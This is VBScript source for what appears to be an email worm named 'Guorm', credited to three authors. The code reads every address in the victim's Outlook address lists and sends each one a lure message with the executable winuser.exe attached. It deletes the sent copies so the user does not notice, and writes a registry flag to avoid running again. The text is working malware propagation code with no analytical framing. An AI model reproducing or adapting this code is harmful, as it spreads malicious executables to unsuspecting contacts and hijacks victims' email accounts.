'Guorm(Vbs). Mirc/Outlook/Vbs. By Kalamar & BrainMuscle & OldWary.
on Error Resume Next
Dim fso, ws
Set fso = CreateObject("Scripting.filesystemobject")
Set ws = CreateObject("WScript.Shell")
if ws.regread("HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail") <> "Done" Then
Set Oapp = CreateObject("Outlook.Application")
if Oapp = "Outlook" then
Set OMapi = Oapp.GetNameSpace("MAPI")
For Each OAddress In OMapi.AddressLists
  If OAddress.AddressEntries.Count <> 0 Then
    For Oque = 1 To OAddress.AddressEntries.Count
      Set Oque2 = OAddress.AddressEntries(Oque)
         if Oque2.address<> "" then
          Set Messge = Oapp.CreateItem(0)
          Messge.to = Oque2.address
          Messge.Subject = "You know what it is!. ;-P"
          Messge.Body = "Hey, here you have!."
          Messge.Attachments.Add fso.getspecialfolder(1) & "\winuser.exe"
          Messge.DeleteAfterSubmit = True
          Messge.Send
         end if
    Next
  End If
Next
ws.regwrite "HKCU\Software\Microsoft\Windows\CurrentVersion\vbsmail", "Done"
Oapp.Quit
end if
